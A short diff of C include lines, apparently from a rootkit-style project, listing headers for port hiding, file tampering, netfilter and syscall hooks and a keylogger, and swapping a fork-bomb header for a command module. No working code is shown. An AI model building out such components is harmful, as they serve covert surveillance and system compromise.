@@ -14,7 +14,7 @@
     #include "hide_ports.h"
     #include "files_hacks.h"
     #include "netfilter_kite.h"
-    #include "forkbomb.h"
+    #include "command_kite.h"
     #include "keylogger.h"
     #include "kite_hook.h"
     #include "reboot_kite.h"
